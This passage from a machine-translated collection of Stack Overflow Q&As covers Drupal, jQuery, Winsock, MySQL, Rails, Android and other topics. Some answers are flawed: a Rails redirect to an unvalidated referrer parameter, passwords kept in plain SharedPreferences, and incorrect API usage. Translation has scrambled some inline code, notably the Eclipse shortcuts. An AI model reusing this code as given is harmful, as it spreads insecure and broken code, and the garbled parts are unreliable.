然后加载要附加的节点，然后将文件对象转换为数组并将其附加到字段。

```
$node = node_load($nid);  // $nid is the id of the node where you want to attach the file.
$node->field_custom_file[LANGUAGE_NONE][] = (array)$file;
node_save($node); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T15:25:02.957

```
$file = (object) array(
    'uid' => 1,
    'uri' => $filepath,
    'filemime' => file_get_mimetype($filepath),
    'status' => 1,
    'display' => 1,
);
$file = file_copy($file, 'public://');
$node->field_file['und'][0] = $file; 
```

# javascript - 无法让 .focus 处理动态创建的输入元素

> ID：15159700
> 
> 赞同：1
> 
> 时间：2013-03-01T14:10:00.447
> 
> 标签：javascript, jquery, jsp

我有一个问题，一旦我的页面被渲染，焦点没有被设置在动态创建的表/输入的第一个输入元素上。

在 .jsp 我有以下内容：

```
<script type="text/javascript">
  $(document).ready(function(){

    if(_page != "one") {
      buildTable(shipQty);
      $('#shipItems[0].barCode').focus();
    }

</script> 
```

有一个包含的 .js，其中包含 buildTable 函数

```
function buildTable(shipQty)
{
  var _tbl = $('<table>').attr({
    id : 'barCodeTable',
    border : '1'
  });

  _tbl.append($('<tr>').append($('<td>').text('Box BarCode'),$('<td>').text('INBOUND Tracking Number')));

  for ( var _index = 0; _index < shipQty; _index++)
  {
    var _inputBarCode = $('<input>').attr({
            class : 'form-med',
            type : 'text',
            name : 'shipItems[' + _index + '].barCode',
            id : 'shipItems[' + _index + '].barCode',
            maxlength: '8'
        }).change(_barCodeChange);

    var _shippingTrackingCode = $('<input>').attr({
      class : 'form-med',
      type : 'text',
      name : 'shipItems[' + _index + '].shipCompanyBarCode',
      id : 'shipItems[' + _index + '].shipCompanyBarCode'
    }).change(_trackingNumberChange);

    _tbl.append($('<tr>').append($('<td>').append(_inputBarCode)).append($('<td>').append(_shippingTrackingCode)));

  }

  $('#tableWrap').append(_tbl);
} 
```

我在stackoverflow上查看了几种不同的解决方案[here](https://stackoverflow.com/questions/5617675/help-with-focusing-a-dynamically-created-input)、[here](https://stackoverflow.com/questions/9610267/jquery-on-load-of-dynamic-element)、[here](http://www.jnorton.co.uk/blog/jquery-load-vs-ready)和其他解决方案，但无济于事。

我不明白这里的问题。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-01T14:12:13.740

它与动态代码无关。问题是您的 jQuery 选择器与您想要的不匹配。您的代码正在寻找属性为零的元素。

您需要转义`.`,`[`和`]`.

```
$('#shipItems\\[0\\]\\.barCode').focus(); 
```

运行示例：http: [//jsfiddle.net/NC4uz/](http://jsfiddle.net/NC4uz/)

* * *

从[jQuery 选择器文档](http://api.jquery.com/category/selectors/)：

> 要使用任何元字符（例如`!"#$%&'()*+,./:;<=>?@[\]^`{|}~ `) as a literal part of a name, it must be escaped with with two backslashes: \\. For example, an element with`id="foo.bar"`，可以使用选择器 $("#foo\.bar")。W3C CSS 规范包含关于有效的 CSS 选择器。同样有用的是 Mathias Bynens 关于标识符的 CSS 字符转义序列的博客条目。

# eclipse - 在 Eclipse 中访问变量的行之间移动的快捷方式

> ID：15159702
> 
> 赞同：1
> 
> 时间：2013-03-01T14:10:11.697
> 
> 标签：eclipse

是否有在访问/读/写/使用变量的行之间跳转的捷径？我注意到滚动条旁边是一个可以单击的控件，但我还没有找到执行相同操作的快捷方式。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T14:15:45.930

我在该变量上使用`Ctrl`-来查找给定`Shift`类`U`中对该变量的引用。

或者`Ctrl`-`K`应该工作。但是`Ctrl`-的问题`K`是，它基本上是搜索下一次出现的突出显示的文本，而不是确切的变量。

例如：您有一个生产者变量和 createProducer() 方法，如果导航到生产者和类中对字符串生产者的其他引用，则突出显示生产者并开始执行`Ctrl`-`K`或`Ctrl`- `Shift`（用于反向搜索）。`K``createProducer()`

我不确定您正在寻找的确切键盘快捷方式，但这有效，我也很好奇是否有任何其他快捷方式。

# networking - OwnCloud 的 SyncClient 桌面和移动设备中的错误 #301

> ID：15159706
> 
> 赞同：0
> 
> 时间：2013-03-01T14:10:20.097
> 
> 标签：networking, synchronization, owncloud, softaculous

我已经通过 Softaculous 自动安装程序（即在我的托管 cPanel 上）在我的网络托管 (webhostingHub) 上安装了 OwnCloud。网络访问工作正常。

但是，当我尝试通过桌面客户端同步同步时，我收到以下错误：

“本地同步文件夹 /Users/...../ownCloud 已存在，正在设置同步。

远程文件夹客户端同步创建失败，出现错误 301。无法建立与 ownCloud 的连接。请再检查一次。”

我在网上搜索过，但都是死胡同。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-05T18:48:29.817

Finally, after intensive research. I found this explanation:

"The remote folder clientsync creation looks like it failed because you're trying to create a folder using webDAV - which will not work on a Shared Server account (any Business level account). You should be able to make this folder mount on your desktop system, but not with the web hosting server. You can make this service work on a VPS or Dedicated server account, but unfortunately not on the your current level of account."

[http://www.inmotionhosting.com/support/community-support/website/owncloud-sync-issues](http://www.inmotionhosting.com/support/community-support/website/owncloud-sync-issues)

Good luck!

# php - 如何在不破坏 ORM 功能的情况下使用 idiorm/granada 定义模型字段？

> ID：15159709
> 
> 赞同：0
> 
> 时间：2013-03-01T14:10:30.443
> 
> 标签：php, orm, magic-methods, idiorm

基于[Idiorm](https://github.com/j4mie/idiorm)的 PHP orm [Granada](https://github.com/Surt/Granada)通过以下方式从数据库中检索字段：

```
class ORM {
  ...

  public function __get($key) {
    return $this->get($key);
  }
}

class ORMWrapper extends ORM {
  ...

  public function get($key) {
        if (method_exists($this, 'get_' . $key)) {
            return $this->{'get_' . $key}();
        } elseif (array_key_exists($key, $this->_data)) {
            return $this->_data[$key];
        }
        elseif (array_key_exists($key, $this->ignore)) {
            return $this->ignore[$key];
        }
        // and so on ...
  } 
```

我的问题是，如果我`public $field`在我的模型类中定义，魔术方法 __get 不会被调用，所以 ORM 不会从数据库中检索字段？

我怎样才能

*   能够`public $field`在我的模型类中声明
*   `$field`如果未定义，仍然调用魔法吸气剂

同时？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T14:46:26.620

我真正想做的就是让自动完成功能在 netbeans 上工作。

像这样声明我的模型类就可以了：

```
/**
 * @property int $address_id
 * @property Address $address
 * @property String $name
 * ...
 */
class Activity extends Model {

    public function address() {
      return $this->belongs_to('Address');
    }

//...
} 
```

这样我可以做到

```
$activity->address->name; 
```

而且我的完成和 ORM 都在工作。

# python - 在启动时运行 python 脚本 - debian

> ID：15159710
> 
> 赞同：3
> 
> 时间：2013-03-01T14:10:32.727
> 
> 标签：python, terminal, debian, raspberry-pi, raspbian

我使用网络摄像头创建了一个应用程序。在这里，我的应用程序会打开一个窗口来显示图像。我想在启动时运行该应用程序。如果我将启动文件放在 rc.local 中，它会在启动时成功运行，但不允许显示窗口。表明 -

```
gtk warning cannot open display. 
```

如何显示窗口？请帮帮我！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T14:18:38.733

如果您正在运行 LXDE（默认在 raspbian 上）

将 .desktop 文件添加到您的 ~/.config/autostart 目录（如果不可用，则创建一个），其中包含 3 行：

```
[Desktop Entry] 
Type=Application
Exec=python /path/to/your/application.py arguments 
```

更新：更新了 Don Question 的评论

# xslt - 创建 XSLT 动态 twitter 引导程序

> ID：15159721
> 
> 赞同：1
> 
> 时间：2013-03-01T14:11:00.480
> 
> 标签：xslt, dynamic, twitter-bootstrap, counter, web-deployment

我在 XSLT 中制作 twitter bootstrap 动态时遇到了一点问题。我什至不知道我正在做的事情是否可行，因为 XSLT 中的变量是不可更改的。这是我的代码：

```
<xsl:for-each select="category">

<div class="accordion-heading">
  <a class="accordion-toggle" data-parent="#accordion2" data-toggle="collapse" href="#collapseOne">
    <xsl:value-of select="title"/>
  </a>
</div> 
```

基本上，对于每个类别，我都需要创建一个新的 href。现在，它设置为collapseOne。我尝试了很多方法，例如 position() 来尝试使这种动态化，但我无法弄清楚。任何输入将不胜感激。如果需要澄清或更多代码，请说出来。我是在这个论坛上发帖的新手。谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-02T00:39:15.770

**创建标准 XSLT 函数[`generate-id()`](http://www.w3.org/TR/xslt#function-generate-id)时正是考虑到了这类用例场景。**

# qt - pip install PySide 未能通过 QtCore 框架检查 (OS X)

> ID：15159722
> 
> 赞同：1
> 
> 时间：2013-03-01T14:11:13.537
> 
> 标签：qt, python-2.7, python-3.x, osx-mountain-lion, pyside

## 错误

当我运行时`pip install PySide`——无论是否在虚拟环境中——构建失败并出现以下错误：

```
... [lots of build info, including a few warnings but no errors, for shiboken]

Linking CXX executable shiboken

ld: framework not found QtCore

clang: error: linker command failed with exit code 1 (use -v to see invocation) 
```

看到我安装了 QtCore 并且存在框架（见下文），我不确定为什么会这样。

## 设置信息

### 软件版本

*   OS X 10.8.2
*   [来自开发人员分发的二进制文件](http://qt-project.org/downloads)的 Qt 4.8.4
*   Python 3.3 已安装并正常工作
*   XCode 4.6
*   Apple LLVM 版本 4.2 (clang-425.0.24)（基于 LLVM 3.2svn）目标：x86_64-apple-darwin12.2.1
*   `pyvenv`使用（有和没有`--no-site-packages`）生成虚拟环境

### 其他配置尝试

*   Python 2.7 已安装并正常工作
*   `mkvirtualenv`使用（有和没有`--no-site-packages`） 生成的虚拟环境
    *   **虚拟环境**1.8.4
    *   **mkvirtualenv** 3.6

### 系统配置

我已经确认 QtCore 实际上已正确安装：`ls /Library/Frameworks`显示了许多框架，包括`QtCore.Framework`.

我的路径目前包括`/Library/Frameworks/QtCore.framework`和`/Library/Frameworks/QtCore.Framework/Versions/4`- 前者在后者位置具有指向组件的符号链接。我什`/Library/Frameworks`至用 .

## 其他注意事项

我已经`easy_install`通过从 Git 存储库中提取并使用`setup.py`. 正如人们所期望的那样，它们都返回相同的结果。

### 我已经读过的东西

*   [PyPi 安装演练](https://pypi.python.org/pypi/PySide#installing-pyside-from-source-on-a-unix-system-ubuntu-12-04-lts)
*   [链接错误：QtCore.framework/Versions/4/QtCore for architecture x86_64（堆栈溢出）](https://stackoverflow.com/questions/10065085/link-error-qtcore-framework-versions-4-qtcore-for-architecture-x86-64) ——但根据我收到的错误消息，链接器似乎已经在请求框架。
*   [Mac OS X：尝试将 (ld) 链接到框架（堆栈溢出）](https://stackoverflow.com/questions/1024704/mac-os-x-trying-to-link-ld-against-a-framework) ——关于链接到框架的一般信息；再一次，我似乎已经涵盖了这一点。
*   [2.8.10 的 OSX 部署目标混淆（CMake 邮件列表）](http://www.cmake.org/pipermail/cmake/2012-November/052688.html) - 看起来像一个非常相似的错误，但我没有直接控制使用（或什至）的`-isysroot`标志，安装结构似乎已经改变基本上在 OS X 10.6 和 10.8 之间。例如，根本不再有目录。`pip``easy_install``python setup.py``/Developer``SDKs`
*   [CMake 错误报告 0013765](http://public.kitware.com/Bug/bug_revision_view_page.php?rev_id=958) – 这个看起来*一模一样*，但似乎已经打了补丁，所以我不确定为什么它仍然会给我带来问题。

### 喜好

我现在没有使用像 Homebrew 或 MacPorts 这样的包管理器，我也不希望这样做，因为我需要尽可能接近与平台无关的安装过程（我们正在查看做跨平台开发；我最终将主要针对 Windows 应用程序，但需要看看它是否可以在我的 Mac 开发机器上运行，而不是 VM）。

它需要能够使用 Python 3 风格的虚拟环境 ( `pyvenv`) 设置，因为这是我们隔离特定需求的首选方法。

# c++ - 使用套接字一次发送整个数据

> ID：15159723
> 
> 赞同：0
> 
> 时间：2013-03-01T14:11:14.630
> 
> 标签：c++, sockets, winsock, winsock2

我正在尝试使用`winsock2`lib 将文件从客户端发送到服务器。

将文件转换为 char 数组后，我使用`send()`命令发送这个数组。

**问题：**数据分开发送。

例如：我的文件大小：144429。它不会立即发送，数据被分成许多部分，例如：第一次发送：1460

第二次发送：21544

第三次发送：57136

ETC..

直到发送整个数据。

所以我的问题是：是什么导致它分部分发送而不是一次发送？？？？

解决方案我发现工作但没有任何意义：如果我要添加

> cout << "bla bla bla";

在 send() 函数之前，它确实工作并一次发送整个 144429。（但如果给 cout 的字符串较短，则不改变，分部分发送）

**代码：**

**客户端**

```
int Client::sendData(char *sendbuf, int length)
{   
    int iResult;

    // if I remove those next few lines (until and including the cout line)
    // the send will split.
    char tmp[1];
    // sent 1 dummy byte
    iResult = send( _connectSocket, tmp, 1, 0 );
    if (iResult == SOCKET_ERROR) {
        printf("send failed with error: %d\n", WSAGetLastError());
        return closeSocket();
    }
    cout << "SENDING DATA..." << endl;

    // THIS IS THE RELEVANT AND ACTUAL DATA I WANT TO SEND
    // send the data
    iResult = send( _connectSocket, sendbuf, length, 0 );
    if (iResult == SOCKET_ERROR) {
        printf("send failed with error: %d\n", WSAGetLastError());
        return closeSocket();
    }

    cout << "Data sent (" << iResult << " Bytes)" << endl;

    return 0;

} 
```

**服务器端：**

```
 char recvbuf[DEFAULT_BUFLEN];
int recvbuflen = DEFAULT_BUFLEN;
int iResult = 0;
int totalBytesRead = 0;

// Receive until the peer shuts down the connection
do {
    totalBytesRead += iResult;
    iResult = recv(_clientSocket, recvbuf, recvbuflen, 0);
    if (iResult > 0) {
        printf("RECEIVED DATA\n");
        printf("Bytes received: %d\n", iResult);

    } else if (iResult == 0)
        printf("Connection closing...\n");
    else {
        printf("recv failed: %d\n", WSAGetLastError());
        closesocket(_clientSocket);
        WSACleanup();
        return 1;
    }

} while (iResult > 0);

// store data into file
FileTransfer::binaryToFile(recvbuf, "doch.docx", totalBytesRead-1);

return 0; 
```

}

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T14:44:47.787

无法保证将`send`某些数据作为一个单元传输——它只是不能那样工作。你必须添加一些额外的信息来告诉系统“这里有这么多数据”和/或“我现在完成了”。即使你可以说服你的发送方在一个数据包中发送所有内容，假设接收方没有直接通过一根简单的电缆连接到发送方，你也不能保证数据包在传递过程中没有被分解通过网络。

您只需要接受，如果您在一个数据包中发送多个字节，您可能需要多次调用 send。为了简化它，编写一个函数，该函数采用任意大小的“整个数据包”并根据需要多次调用 send...如果您有一个协议来指示发送的数据的大小 [例如在前几个字节中] ，你可以有一个做同样事情的接收函数。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-01T14:22:22.193

根据您使用的套接字类型，底层传输协议中的数据大小可能会受到限制。

如果您使用网络套接字，则大小受最大传输单元的限制（请参阅：[http](http://en.wikipedia.org/wiki/Maximum_transmission_unit) ://en.wikipedia.org/wiki/Maximum_transmission_unit ）。

如果您的数据不适合这个大小，您将不得不在循环中迭代发送部分数据，直到发生错误或发送所有数据。

# python - Python中的if比较语句

> ID：15159726
> 
> 赞同：3
> 
> 时间：2013-03-01T14:11:21.463
> 
> 标签：python, if-statement

这段代码返回“cat”、“dog”、“hamster”*和*“unicorn”，但它根本不应该返回“unicorn”！这有什么原因吗？

```
if random.randint(0,10) < 5:
    print("dog")    
elif  random.randint(0,10) > 5:
    print("cat")    
elif  random.randint(0,10) == 5:
    print("hamster")    
else:
    print("unicorn") 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-03-01T14:14:23.267

每次比较都会得到新的随机数。你的意思可能是：

```
my_random_int = random.randint(0,10)

if my_random_int < 5:
    print("dog")

elif  my_random_int > 5:
    print("cat")

elif my_random_int == 5:
    print("hamster")

else:
    print("unicorn") 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-03-01T14:13:59.523

`random.randint`每次到达时都会再次调用，每次都可能产生不同的结果（因为这是函数的目的）。

如果要使用相同的值重复测试，则先存储该值。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-03-01T14:14:16.110

您应该只创建一次随机数！

```
val = random.randint(0,10)
if val < 5:
    print("dog")

elif val > 5:
    print("cat")

elif val == 5:
    print("hamster")

else:
    print("unicorn") 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-03-01T14:14:21.987

假设缩进正确，三个随机整数没有理由分别为`>=5`,`<=5`和 "not `5`"。

您可能打算这样做：

```
value = random.randint(0, 10)

if value < 5:
    print("dog")
elif value > 5:
    print("cat")
elif value == 5:
    print("hamster")
else:
    print("unicorn") 
```

现在没有独角兽的机会。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-03-01T14:14:56.140

每次调用时，您的随机数都是不同的，`random.randint`因此当您测试第一个 if 并越过它时，它可能是 7，然后是 3，然后是 4，然后 bam，您就是独角兽。

你应该`random.randint`只在你的开头调用一次`if`，保存它的值并检查它。

```
myrand = random.randint(0,10)
if myrand < 5:
  print("dog")    
elif myrand > 5:
  print("cat")    
elif myrand == 5:
  print("hamster")    
else:
  print("unicorn") 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-03-01T14:14:02.463

这里的问题是您每次都在生成一个新的随机数。您应该创建一次，然后将其分配给一个变量，然后检查它。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2013-03-01T14:15:02.890

您正在生成三个不同的随机数。你的想法是这样的：

```
random_number = random.randint(0,10)

if random_number < 5:
    print("dog")

elif random_number > 5:
    print("cat")

elif random_number == 5:
    print("hamster")

else:
    print("unicorn") 
```

此代码只会返回一个单词，并且永远不会返回“独角兽”。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2013-03-01T14:16:45.223

您只需要创建一个随机整数。

您的代码应该是：

```
myRandom = random.randint(0,10)

if myRandom < 5:
    print("dog")    
elif  myRandom > 5:
    print("cat")    
elif  myRandom == 5:
    print("hamster")    
else:
    print("unicorn") 
```

# vim - vim 正则表达式和高亮语法：查找匹配项并忽略其中的子匹配项

> ID：15159728
> 
> 赞同：3
> 
> 时间：2013-03-01T14:11:41.707
> 
> 标签：vim, vim-syntax-highlighting

我正在尝试在 VIM 中编写语法荧光笔。你如何在另一场比赛中突出比赛？

为了找到每个匹配项，我创建了两条`syn match`线，它们在匹配项分开的地方工作。

```
syn match celString "^xpath=.\{-};"      -> matches "xpath=.........;"
syn match celComment "\${.\{-}}"         -> matches "${LIB_METADATA};" 
```

* * *

![突出语法结果 - 第一行有单独的匹配，而第二行有重叠的匹配](../Images/33122bfc547fc80918a8910cd7a6160f.png)

*   xpath 字符串的第一行是粉红色的，字符串的第一行是蓝色的`${..}`。

*   对于 xpath 字符串，第二行是粉红色的，但该`${..}`字符串中包含的内容将被忽略。

我试图改变`syn match`线条的顺序，但这没有任何效果。

我很感激你的想法。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-01T14:43:30.863

默认情况下，Vim 只将语法组应用于尚未分配语法的文本。要指定一个组可以包含其他组，请使用以下`contains=...`属性：

```
:syn match celString "^xpath=.\{-};" contains=celComment 
```

定义的顺序在这里应该无关紧要。有关`:help :syn-contains`更多信息，请参阅。

# jquery - jquery json对象加入

> ID：15159732
> 
> 赞同：0
> 
> 时间：2013-03-01T14:11:52.473
> 
> 标签：jquery, json

我有 2 个 json 对象，每个对象都有我想加入的唯一 ID。

对象是：

```
main:

{"meta": {"limit": 100, "next": null, "offset": 0, "previous": null, "total_count": 1}, 
   "objects": [{"name": "John", "date": "2013-02-25", "mid": "512bd2f0e1cb890007b0cbf1"}]}

mid

{"meta": {"limit": 20, "next": null, "offset": 0, "previous": null, "total_count": 1}, 
   "objects": [{"id": "512bd2f0e1cb890007b0cbf1", "title": "My Fav"}]} 
```

您如何将它们与 jquery 加入 1 个对象并获取相同的 id 是

```
 where main.objects.mid = mid.objects.id 
```

优选连接对象

```
 newobject.
{"meta": {"limit": 100, "next": null, "offset": 0, "previous": null, "total_count": 1}, "objects": [{"name": "John", "date": "2013-02-25", "mid": "512bd2f0e1cb890007b0cbf1"
            "mid": {title": "My Fav"}}
}]} 
```

如果您注意到，只需将数据中间对象附加到主标题中。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T14:15:03.703

你可以使用 jQuery.extend，这里是 url：

[http://api.jquery.com/jQuery.extend/](http://api.jquery.com/jQuery.extend/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T14:15:45.783

```
a = {"meta": {"limit": 100, "next": null, "offset": 0, "previous": null, "total_count": 1}, 
   "objects": [{"name": "John", "date": "2013-02-25", "mid": "512bd2f0e1cb890007b0cbf1"}]}

b = {"meta": {"limit": 20, "next": null, "offset": 0, "previous": null, "total_count": 1}, 
   "objects": [{"id": "512bd2f0e1cb890007b0cbf1", "title": "My Fav"}]}

console.log($.extend({},a,b)); 
```

这会将目标设置为新对象，以确保在不修改原始对象的情况下进行深层复制。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T14:14:27.543

我认为扩展是你想要的。 [http://api.jquery.com/jQuery.extend/](http://api.jquery.com/jQuery.extend/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-01T14:14:45.643

很难说没有更好的描述，但我会使用合并它们`$.extend()`

```
var object1 = {"meta": {"limit": 100} };

var object2 = {"meta": {"limit": 50} };

var mergedObjects = $.extend(object1, object2); 
```

[API](http://api.jquery.com/jQuery.extend/)

# android - 在 Android 中存储对象的 ArrayList

> ID：15159734
> 
> 赞同：0
> 
> 时间：2013-03-01T14:11:53.753
> 
> 标签：android, arraylist

我有一个根据需要保持值`ArrayList`的对象。 现在我想将它保存为 FILE 或 in或将其转换为ARRAY 并保存.. 我的数组列表是这样的： `String`
`SharedPreferences``JSON`

```
 ArrayList<Struct_Saved_Domains> arraylist = new ArrayList<Struct_Saved_Domains>(); 
```

我怎样才能做到这一点？任何的想法？？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T14:24:29.777

您可以使用[Gson](http://code.google.com/p/google-gson/)将您的对象转换为字符串，然后将其保存在共享首选项中：

```
SharedPreferences prefs = context.getSharedPreferences("prefName", Context.MODE_PRIVATE);
Editor editor = prefs.edit();
editor.putStringSet("myList", new Gson().toJson(arraylist).toString());
editor.apply(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T15:07:33.577

您可以将以下代码用于共享首选项。

```
public class WebService {

    String PREF_NAME = "PREF_NAME";
    public static SharedPreferences sp;
    Editor spEdit;

    public String UserID;
    public String Password;

    public LoginWebService(Context ctx) {
        // TODO Auto-geneated constructor stub
        sp = ctx.getSharedPreferences(PREF_NAME, 0);
        spEdit = sp.edit();
    }

    public void setUserID(String UserID) {
        spEdit.putString("UserID", UserID);
        spEdit.commit();

    }

    public String getUserID() {
        return sp.getString("UserID", "");    
    }

    public String getPassword() {
        return sp.getString("Password", "");
    }

    public void setPassword(String Password) {
        spEdit.putString("Password", Password);
        spEdit.commit();
    }

    public void clear(){
        spEdit.clear();
        spEdit.commit();
    }

} 
```

将数据保存在共享首选项中时，您可以使用如下所示。

```
WebService objlogin=new WebService(context);
objlogin.clear();

for (int i = 0; i <arraylist.size(); i++) 
{
objlogin.setUserID(arraylist.get(i).something); 
objlogin.setPassword(arraylist.get(i).something); 

} 
```

然后，您所有的数据都将保存在分片首选项中。

希望这会帮助你。

# c# - 汉明窗生成一条线

> ID：15159739
> 
> 赞同：0
> 
> 时间：2013-03-01T14:12:00.930
> 
> 标签：c#, audio, naudio, hamming-window

我有一个音频文件并从声卡缓冲区读取所有数据。然后，我转换`byte[]`为`float[]`将它们用于汉明窗。音频波形为：

![http://i.stack.imgur.com/2NhTB.png](../Images/7eccd7a6cdf6e2a6037c2f8912912f14.png)

使用汉明窗后：

![http://i.stack.imgur.com/N87qE.png](../Images/27267c45323c64e4a220efd49bef65df.png)

带有汉明窗的音频波形对吗？我的错误在哪里？

顺便说一句，我使用 naudio 库来处理音频：

```
WaveChannel32 wave = new WaveChannel32(new WaveFileReader("sesDosyası.wav"));
byte []buffer = new byte[wave.length];
float []data = new float[wave.length / 4];
int read = wave.Read(buffer, 0, wave.length);
for (int i = 0; i < read / 4; i++)
{   
    data[i] = BitConverter.ToSingle(buffer, i * 4); //converting byte to float
    chart1.Series["wave"].Points.Add(data[i]); //first waveform
}

for (int j = 0; j < read/4; j++)
{
   data[j] = (float)(0.54 - 0.46 * Math.Cos((2 * Math.PI * data[j]) / (read / 4 - 1)));//hamming
   chart2.Series["wave"].Points.Add(data[j]); //second waveform
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T15:06:52.863

看来您正在将窗口应用于整个波，所以`read`会很大，所以对于[-1,1] 之间的区间，其中的项`cos`总是非常接近 0 。`data`

所以你总是得到`.54 - .46*cos(0)`= `.54 - .46*1.0`=`.08`

从[维基百科](http://en.wikipedia.org/wiki/Window_function#Hann_.28Hanning.29_window)，只`j`应该在余弦内 - 给出窗口，然后乘以`data[j]`：

```
window =  0.54 - 0.46 * Math.Cos( (2*Math.PI * j)/(total - 1) ).
hammed_signal = data[j]*window; 
```

你为什么要对整个波应用汉明窗？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T14:52:45.857

我认为你的汉明线是错误的：

```
data[j] = (float)(0.54 - 0.46 * Math.Cos((2 * Math.PI * data[j]) / (read - 1))); 
```

随着您的循环从`0`到`read/4`，并且您正在除以`read`，因此如果您已阅读 16 个样本，则您的 for 循环仅查看前 4 个，但除以 15，而不是 3。

```
var total = read / 4;

for (int j = 0; j < total; j++)
{
   data[j] = (float)(0.54 - 0.46 * Math.Cos((2 * Math.PI * data[j]) / (total- 1)));//hamming
   chart2.Series["wave"].Points.Add(data[j]); //second waveform
} 
```

# mysql - 对同一列进行多次计数并插入另一个表

> ID：15159745
> 
> 赞同：0
> 
> 时间：2013-03-01T14:12:24.030
> 
> 标签：mysql, sql, pivot

我有一个包含三列的学生表

```
1\. Student Name
2\. Class Name
3\. Test result 
```

一个学生参加了不止一项测试，结果不同。我正在尝试将数据放入另一个具有

```
1\. Stundent Name+CLass Name ( Concatenated )
2\. Pass (No of tests Passed)
3\. Fail (No of tests failed)
4\. Absent (No of tests Absent) 
```

我用

```
select count(*)
from Student 
where Result in ('Passed')
group by StuName, ClassName; 
```

获取每个 stu+class 组合的通过科目计数。对于失败和缺席的测试也是如此。

我应该如何修改代码以插入表二？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-01T14:14:47.323

MySQL 支持*内联* `IF`语句，

```
SELECT  CONCAT(StudentName, ' ', ClassName) Student_Class,
        SUM(test = 'PASSED') totalPass,
        SUM(test = 'Failed') totalFailed,
        SUM(test = 'Absent') totalAbsent
FROM    student
GROUP   BY CONCAT(StudentName, ' ', ClassName) 
```

当你想插入上面查询的结果时，使用`INSERT INTO..SELECT`语句，

```
INSERT  INTO tableNAME(col1, totalPass, totalFailed, totalAbsent)
SELECT  CONCAT(StudentName, ' ', ClassName) Student_Class,
        SUM(test = 'PASSED') totalPass,
        SUM(test = 'Failed') totalFailed,
        SUM(test = 'Absent') totalAbsent
FROM    student
GROUP   BY CONCAT(StudentName, ' ', ClassName) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-01T14:15:24.873

您可以使用具有以下功能的聚合函数轻松*旋转*`CASE`数据：

```
select concat(StuName, ',', ClassName) StuNameClass,
  sum(case when result = 'Passed' then 1 else 0 end) Passed,
  sum(case when result = 'Fail' then 1 else 0 end) Fail,
  sum(case when result = 'Absent' then 1 else 0 end) Absent
from Student 
group by concat(StuName, ',', ClassName); 
```

然后，如果您想将数据插入到另一个表中：

```
insert into Table2 (StudentClassName, Passed, Fail, Absent)
select concat(StuName, ',', ClassName) StuNameClass,
  sum(case when result = 'Passed' then 1 else 0 end) Passed,
  sum(case when result = 'Fail' then 1 else 0 end) Fail,
  sum(case when result = 'Absent' then 1 else 0 end) Absent
from Student 
group by concat(StuName, ',', ClassName); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-01T14:18:29.770

```
INSERT INTO t (name_class, passed_count, failed_count, absent_count)
SELECT CONCAT(StuName, ' ', ClassName) AS name_class, 
       SUM(IF(Result='Passed', 1, 0)) AS passed_count, 
       SUM(IF(Result='Failed', 1, 0)) AS failed_count, 
       SUM(IF(Result='Absent', 1, 0)) AS absent_count
FROM Student
GROUP BY StuName, ClassName; 
```

# ruby-on-rails-3.2 - Rails - 保存时 - 返回上一页（或用户单击“编辑”的页面）

> ID：15159748
> 
> 赞同：0
> 
> 时间：2013-03-01T14:12:34.113
> 
> 标签：ruby-on-rails-3.2

有点卡在这个上，因为我发现了很多信息，但似乎没有一个有效。

用户可以从两个屏幕之一、客户索引或主屏幕编辑客户。我希望更新将他们发送回他们单击编辑按钮的屏幕。

*   我发现听起来很完美的第一件事是：`redirect_to :back`
*   第二件事似乎是这样的：`request.referer`或`request.env['HTTP_REFERER']`

这两种“解决方案”都只是再次加载编辑屏幕，并没有将用户送回索引屏幕或主屏幕。

这是我的更新定义：

```
def update
  @client = Client.find(params[:id])
  if @client.update_attributes(params[:client])
    redirect_to clients_path, notice: "#{@client.name} (#{@client.company}) was successfully updated."
  else
    render action: "edit"
  end
end 
```

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-02T03:54:49.367

终于到了这个底部。

`:back`并且`request.referer`按预期工作 - 例如从编辑表单传递到控制器，编辑表单当然*是*推荐人。因此，我需要在包含引用 URL 的表单上设置一个隐藏字段。

我将此添加到我的部分表单中：`<%= hidden_field_tag :referrer, request.referer %>`

我使用`hidden_field_tag`了所以我只有一个名为referrer的变量，我不希望它在任何数组中都是由基于模型名称等的简单表单创建的

然后在控制器中我添加了`redirect_to params[:referrer]`，**瞧！**，一切都是一种享受。

我现在可以单击主页上的编辑按钮，一旦保存，我就会回到主页，或者如果我单击索引页面上的编辑按钮，我就会回到那里，简单！

NB - 轻微的安全问题。我最终可能会在隐藏字段标记中发送一个变量，然后在控制器内解释该变量。例如，referrer 值 1 进入主页，值 2 进入索引。我认为这更“安全”，因为这两个选择是我明确设置的路径。稍后我会对其进行排序并在需要时更新它！

# jquery - 对 FieldValidations 和表单提交做出反应

> ID：15159750
> 
> 赞同：0
> 
